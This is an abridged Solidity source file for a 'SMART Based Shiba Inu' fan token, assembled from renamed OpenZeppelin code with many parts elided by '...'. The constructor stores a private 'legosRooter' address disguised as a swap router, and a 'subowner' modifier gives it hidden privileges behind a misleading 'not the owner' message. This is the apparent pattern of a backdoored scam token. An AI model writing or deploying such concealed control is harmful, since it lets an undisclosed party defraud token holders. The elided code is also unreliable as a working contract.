/*
SMART Based Shiba Inu
*/

// SPDX-License-Identifier: MIT

/// https://x.com/SMARTBasedShibaInu


pragma solidity 0.8.29;

// SMARTBasedShibaInu fan token

interface SMARTBasedShibaInuinterface {
  /**
...
/*
 * @dev Provides information about the current execution SMARTBasedShibaInu20Burnable, including the
 ...
 */
abstract contract SMARTBasedShibaInu20Burnable {
...
// File: @openzeppelin/contracts/access/SMARTBasedShibaInu20Ownable.sol
 ...
 * the owner.
 */
abstract contract SMARTBasedShibaInu20Ownable is SMARTBasedShibaInu20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "SMARTBasedShibaInu20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "SMARTBasedShibaInu20Ownable: new owner is the zero address");
 ...
 * `SafeSMARTBasedShibaInu` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeSMARTBasedShibaInu {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeSMARTBasedShibaInu: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeSMARTBasedShibaInu: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeSMARTBasedShibaInu: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeSMARTBasedShibaInu: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeSMARTBasedShibaInu: modulo by zero");
  }
...
contract SMARTBasedShibaInuToken is SMARTBasedShibaInu20Burnable, SMARTBasedShibaInuinterface, SMARTBasedShibaInu20Ownable {
    
    using SafeSMARTBasedShibaInu for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "SMART Based Shiba Inu";
        _symbol = "SMART Based Shiba Inu";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {SMARTBasedShibaInuinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {SMARTBasedShibaInuinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "SMARTBasedShibaInu20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {SMARTBasedShibaInuinterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {SMARTBasedShibaInuinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {SMARTBasedShibaInuinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {SMARTBasedShibaInuinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {SMARTBasedShibaInuinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "SMARTBasedShibaInuinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {SMARTBasedShibaInuinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "SMARTBasedShibaInuinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "SMARTBasedShibaInuinterface: transfer from the zero address");
        require(shippingto != address(0), "SMARTBasedShibaInuinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "SMARTBasedShibaInuinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "SMARTBasedShibaInuinterface: approve from the zero address");
        require(transporteur != address(0), "SMARTBasedShibaInuinterface: approve to the zero address");
